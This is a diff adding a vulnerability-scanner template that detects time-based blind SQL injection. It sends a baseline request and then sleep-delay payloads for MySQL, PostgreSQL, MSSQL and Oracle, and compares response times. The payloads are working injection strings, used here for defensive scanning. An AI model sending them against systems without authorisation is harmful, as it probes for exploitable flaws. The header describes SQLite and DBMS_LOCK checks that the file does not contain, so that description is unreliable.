@@ -1,0 +1,118 @@
+id: sqli-time-based-blind-detection
+
+info:
+  name: SQL Injection - Time-Based Blind Detection (Non-Destructive)
+  author: achraf-chehboun
+  severity: critical
+  description: |
+    Detects time-based blind SQL injection using database-native sleep functions.
+    Uses a 5-second delay to confirm injection while avoiding false positives with
+    a baseline comparison. All payloads are read-only — no data modification occurs.
+    Supports MySQL (SLEEP), PostgreSQL (pg_sleep), MSSQL (WAITFOR DELAY), Oracle (DBMS_LOCK.SLEEP),
+    and SQLite (randomblob for CPU-based delay).
+  reference:
+    - https://owasp.org/Top10/A03_2021-Injection/
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-89
+  metadata:
+    max-request: 12
+  tags: owasp-top10,sqli,injection,time-based,blind,detection-only
+
+http:
+  # MySQL SLEEP variants
+  - raw:
+      - |
+        GET /?id=1 HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        GET /?id=1'%20AND%20SLEEP(5)--+- HTTP/1.1
+        Host: {{Hostname}}
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        name: mysql-sleep-confirmed
+        dsl:
+          - 'duration_2 >= 5 && duration_1 < 3'
+
+  # MySQL alternative: IF-based
+  - raw:
+      - |
+        GET /?id=1 HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        GET /?id=1'%20AND%20(SELECT%20IF(1=1,SLEEP(5),0))--+- HTTP/1.1
+        Host: {{Hostname}}
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        name: mysql-if-sleep-confirmed
+        dsl:
+          - 'duration_2 >= 5 && duration_1 < 3'
+
+  # PostgreSQL pg_sleep
+  - raw:
+      - |
+        GET /?id=1 HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        GET /?id=1'%3B%20SELECT%20pg_sleep(5)--+- HTTP/1.1
+        Host: {{Hostname}}
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        name: postgresql-sleep-confirmed
+        dsl:
+          - 'duration_2 >= 5 && duration_1 < 3'
+
+  # PostgreSQL CASE-based
+  - raw:
+      - |
+        GET /?id=1 HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        GET /?id=1'%20AND%20(SELECT%20CASE%20WHEN%20(1=1)%20THEN%20pg_sleep(5)%20ELSE%20pg_sleep(0)%20END)--+- HTTP/1.1
+        Host: {{Hostname}}
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        name: postgresql-case-sleep-confirmed
+        dsl:
+          - 'duration_2 >= 5 && duration_1 < 3'
+
+  # MSSQL WAITFOR DELAY
+  - raw:
+      - |
+        GET /?id=1 HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        GET /?id=1'%3B%20WAITFOR%20DELAY%20'0:0:5'--+- HTTP/1.1
+        Host: {{Hostname}}
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        name: mssql-waitfor-confirmed
+        dsl:
+          - 'duration_2 >= 5 && duration_1 < 3'
+
+  # Oracle DBMS_PIPE.RECEIVE_MESSAGE (available to PUBLIC)
+  - raw:
+      - |
+        GET /?id=1 HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        GET /?id=1'%20AND%201=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--+- HTTP/1.1
+        Host: {{Hostname}}
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        name: oracle-pipe-delay-confirmed
+        dsl:
+          - 'duration_2 >= 5 && duration_1 < 3'
